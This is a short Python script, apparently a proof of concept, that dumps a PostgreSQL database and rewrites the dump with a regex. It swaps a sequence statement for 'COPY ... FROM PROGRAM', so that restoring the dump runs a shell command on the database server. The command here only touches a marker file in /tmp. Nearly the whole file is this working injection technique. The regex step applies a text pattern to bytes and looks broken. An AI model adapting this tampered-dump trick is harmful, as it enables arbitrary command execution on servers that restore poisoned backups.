from contextlib import closing
import os
import psycopg2
import re

from util import database, exec_psql


exec_psql([
    """CREATE TABLE public.dump (t TEXT)""",
    """CREATE SEQUENCE seq START 10000000000000""",
    """SELECT nextval('seq')"""])

fname = 'copy.dump'

os.system('pg_dump -U postgres -Fc > {}'.format(fname)) 

with open(fname, 'rb') as fp:
    data = fp.read()

repl = re.sub('(SELECT.*public.seq\x27.*;)', "COPY public.dump FROM PROGRAM 'touch /tmp/command_execution';", data)

with open(fname, 'wb') as fp:
    fp.write(repl)

exec_psql([
    """DROP TABLE public.dump""",
    """DROP SEQUENCE seq"""])
